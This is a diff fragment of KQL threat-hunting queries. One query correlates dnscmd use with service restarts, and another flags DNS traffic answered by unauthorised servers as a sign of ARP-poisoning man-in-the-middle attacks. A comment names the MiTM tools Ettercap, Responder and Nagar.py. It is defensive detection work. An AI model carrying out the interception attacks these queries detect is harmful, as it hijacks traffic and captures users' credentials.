+| join kind=leftouter ServiceEvents on Computer
+| where isnull(RestartTime)
+    or abs(datetime_diff("minute", DnscmdTime, RestartTime)) < 60
+| project
+    DnscmdTime,
+    Computer,
+    SubjectUserName,
+    CommandLine,
+    RestartTime,
+    Activity
+| order by DnscmdTime desc
+
+
+// -----------------------------------------------------------------------------
+// Q35. DNS MiTM INDICATORS — DNS TRAFFIC HANDLED BY UNEXPECTED SERVERS
+//      In a DNS MiTM attack (ARP poisoning + DNS interception), clients
+//      send DNS queries that are intercepted and forwarded by the attacker.
+//      From ASimDnsActivityLogs, DstIpAddr shows which DNS server handled
+//      the query. Any IP NOT in your authorized DNS server list is suspicious.
+//      Populate CorporateDNS with your internal DNS server IPs.
+//      Ref: VerSprite blog — "MiTM Attack Between Windows Machines and DNS"
+//      Tool: Nagar.py, Ettercap, Responder MiTM mode. MITRE T1557
+// -----------------------------------------------------------------------------
+let CorporateDNS = dynamic([]);
+// Example: dynamic(["10.0.0.53", "10.0.1.53", "192.168.1.1"])
+ASimDnsActivityLogs
+| where TimeGenerated > ago(7d)
+| where isnotempty(DstIpAddr)
+| where DstIpAddr !in (CorporateDNS)
+       and not(DstIpAddr startswith "127.")
+       and not(DstIpAddr startswith "::1")
+       and not(DstIpAddr startswith "169.254.")
+| summarize
+    QueryCount     = count(),
+    UniqueDomains  = dcount(DnsQuery),
+    RogueServers   = make_set(DstIpAddr, 10),
+    SampleDomains  = make_set(DnsQuery, 15),
+    FirstSeen      = min(TimeGenerated),
+    LastSeen       = max(TimeGenerated)
+  by SrcIpAddr, SrcHostname
+| where QueryCount > 5
+| order by QueryCount desc
